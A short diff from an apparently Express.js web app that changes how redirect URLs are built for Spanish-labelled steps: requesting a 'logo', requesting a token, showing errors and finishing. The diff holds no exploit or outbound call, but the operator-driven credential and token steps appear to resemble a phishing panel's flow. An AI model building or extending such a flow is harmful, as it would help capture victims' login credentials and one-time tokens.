@@ -147,23 +147,23 @@ app.get(['/', '/index.html', '/token.html', '/dashboard.html'], (req, res) => {
 const handleRedirect = (action, baseUrl = '') => {
     const redirects = {
         'error_logo': { 
-            url: `${baseUrl}/index.html?action=error_logo`, 
+            url: `${baseUrl}index.html?action=error_logo`, 
             message: 'Por favor verifique su logo e intente nuevamente.'
         },
         'pedir_logo': { 
-            url: `${baseUrl}/index.html?action=pedir_logo`, 
+            url: `${baseUrl}index.html?action=pedir_logo`, 
             message: null
         },
         'error_token': { 
-            url: `${baseUrl}/token.html?action=error_token`, 
+            url: `${baseUrl}token.html?action=error_token`, 
             message: 'Token incorrecto. Por favor intente nuevamente.'
         },
         'pedir_token': { 
-            url: `${baseUrl}/token.html?action=pedir_token`, 
+            url: `${baseUrl}token.html?action=pedir_token`, 
             message: null
         },
         'finalizar': { 
-            url: `${baseUrl}/dashboard.html?action=finalizar`, 
+            url: `${baseUrl}dashboard.html?action=finalizar`, 
             message: 'Proceso finalizado exitosamente'
         }
     };
